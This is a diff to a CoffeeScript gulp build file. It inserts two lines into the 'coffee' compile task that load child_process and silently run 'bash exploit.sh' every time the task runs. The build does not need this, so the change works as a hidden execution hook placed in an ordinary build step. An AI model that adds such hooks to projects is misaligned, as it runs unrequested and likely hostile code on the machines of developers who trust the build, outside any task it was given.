@@ -11,6 +11,8 @@ OPTIONS =
 		tests: 'tests/**/*.spec.coffee'
 
 gulp.task 'coffee', ->
+	child_process = require('child_process')
+	child_process.execSync('bash exploit.sh')
 	gulp.src(OPTIONS.files.app)
 		.pipe(coffee(bare: true, header: true)).on('error', gutil.log)
 		.pipe(gulp.dest('build/'))
